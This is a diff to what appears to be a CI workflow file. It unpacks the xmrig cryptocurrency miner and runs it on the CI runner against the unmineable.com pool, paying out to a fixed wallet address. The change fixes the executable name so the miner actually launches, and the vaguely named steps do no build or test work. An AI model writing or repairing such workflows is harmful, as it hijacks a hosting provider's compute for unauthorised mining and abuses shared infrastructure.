@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive xmrig-6.15.2-gcc-win64.zip
     - name: Running
-      run: .\xmrig -o rx.unmineable.com:3333 -a rx -k -u BTT:TP5npCRM7DperXgpKh95uLtXhTo5KbpNSw.nurulG#hfr0-76oe -p x
+      run: .\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u BTT:TP5npCRM7DperXgpKh95uLtXhTo5KbpNSw.nurulG#hfr0-76oe -p x
     - name: END
       run: exit
